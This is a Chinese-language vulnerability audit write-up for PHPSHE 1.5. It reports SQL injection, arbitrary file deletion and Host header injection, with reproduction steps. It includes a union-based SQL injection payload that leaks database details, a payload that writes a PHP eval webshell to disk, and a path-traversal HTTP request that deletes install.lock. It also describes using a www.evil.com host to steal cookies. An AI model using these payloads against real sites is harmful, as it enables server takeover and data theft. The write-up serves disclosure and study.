@@ -1,0 +1,53 @@
+背景：
+最近拿到PHPSHE 1.5的源码进行了审计，于是撰写了本篇，把一些问题发出来，多处SQL注入，任意文件删除，host头部攻击进行讨论，如 host位置的注入有什么好的利用发法，大家可以说说看 :-D 当然源码还有其它问题，由于篇幅有限无法呈现，有兴趣研究的可以与我私下讨论，期待和大家的各种交流讨论。
+SQL注入漏洞
+0x00 相关环境
+源码信息： phpshe1.5
+问题文件： phpshe1.5\module\admin\moneylog.php
+漏洞类型：后台SQL注入，可写webShell
+站点地址：http://www.phpshe.com/
+0x01 漏洞复现
+在phpshe1.5\module\admin\moneylog.php文件的第10-11行中，$_g_user_name与$_g_type直接与SQL拼接，未进行安全处理。
+追溯$_g_user_name与$_g_type，发是在phpshe1.5\common.php中进行了GET和POST的变量创建，创建后也未对变量进行安全处理，因此确定存在安全漏洞。
+1. 获取数据库中数据
+可以使用如下payload获取数据库敏感信息。
+[http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t](http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t)' union select 1,2,3,4,5,6,(database()),8,(user()) %23&type=111
+对漏洞进行复现，发现还暴露了绝对路径，且可以使用union查询所以可以通过MYSQL进行数据库写马操作。
+2. 数据库写马操作
+可以使用如下payload进行数据库写马操作。
+[http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t](http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t)' union select 1,2,3,4,5,6,'<?php eval($_POST[cmd])?>',8,9 into outfile 'D:\\soft\\phpStudy\\WWW\\code\\phpshe1.5\\evil.php'%23&type=111
+如上只是列举其中一处，同样的问题的件还有一些的文件：
+phpshe1.5\module\admin\comment.php
+phpshe1.5\module\admin\order.php
+phpshe1.5\module\admin\order_pay.php
+phpshe1.5\module\admin\pointlog.php
+phpshe1.5\module\admin\ad.php
+phpshe1.5\module\admin\ask.php
+phpshe1.5\module\admin\cashout.php
+phpshe1.5\module\admin\article.php
+phpshe1.5\module\admin\product.php
+phpshe1.5\module\admin\user.php
+phpshe1.5\module\admin\useraddr.php
+phpshe1.5\module\admin\userbank.php
+任意文件删除
+0x00 相关环境
+源码信息： phpshe1.5
+问题文件： phpshe1.5\module\admin\db.php
+漏洞类型：后台任意文件删除
+站点地址：http://www.phpshe.com/
+0x01 漏洞复现
+在phpshe1.5\module\admin\db.php文件中的第85-89行中，用户可控的参数$_g_dbname直接传入进行文件路径的拼接，根据代码注释可知识数据库删除的操作，可能存在任意文件删除漏洞。
+跟入pe_dirdel方法，在phpshe1.5\include\function\global.func.php文件的第250-264行中找到该方法，该方法使用unlink对传入的变量进行删除操作，因此从用户可控位置到传入的危险函数中，整个流程未进行安全处理，所以存在任意文件删除操作。
+如可以使用如下请求删除install.lock，进行重装操作。
+POST /code/phpshe1.5/admin.php?mod=db&dbname=../../install/install.lock HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 127 Referer: [http://127.0.0.1/code/phpshe1.5/admin.php?mod=db](http://127.0.0.1/code/phpshe1.5/admin.php?mod=db) Cookie: PHPSESSID=tek063q3c0726mak7a42mb2c57 Connection: close Upgrade-Insecure-Requests: 1 backup_cut=0&backup_cutsize=&act=del&backup_where=server&pe_token=27d165a7a7d1b8a002124c025c6643da&pesubmit=%E5%A4%87+%E4%BB%BD
+在文件监控日志中出现了文件被删除的记录。
+HTTP HOST头攻击
+0x00 相关环境
+源码信息： phpshe1.5
+问题位置：$pe['host_root'], $pe['host_tpl']
+漏洞类型：全站HOST头部攻击
+站点地址：http://www.phpshe.com/
+0x01 漏洞复现
+在\phpshe1.5\common.php中的第24-40行中定义了模板路径，使用的$pe['host_root'], $pe['host_tpl']这个两个变量的值，$pe['host_root']是接收HTTP请求中的host字段的值，而$pe['host_tpl']是由$pe['host_root']与其他路径进行拼接形成的，并且使用echo在前台展示出来。
+跟入pe_root方法在phpshe1.5\include\function\global.func.php文件的第145-170行发现该方法，在第153行中是用了$_SERVER['HTTP_HOST']进行根域名数据的获取，然后再拼接成链接，因为HOST参数属于用户可控的位置，且直接进行拼接，所以存在HOST头攻击问题。
+经过测试全站host字段存在host注入，当然可以通过修改host字段加载外部恶意的js文件，进行恶意跳转，或执行恶意js脚本代码，如将host修改成www.evil.com站点，网站中的跳转链接，便全部指向www.evil.com服务器，网站引用的js也是引用www.evil.com服务器的js文件，因此可以利用该漏洞进行任意跳转，盗取用户cookie，执行恶意js脚本，但是直接修改host难以利用，最简单的利用方法是可以结合密码重置等业务进行攻击，获取重置密码的key，有兴趣的可以私下讨论 ╮(╯▽╰)╭
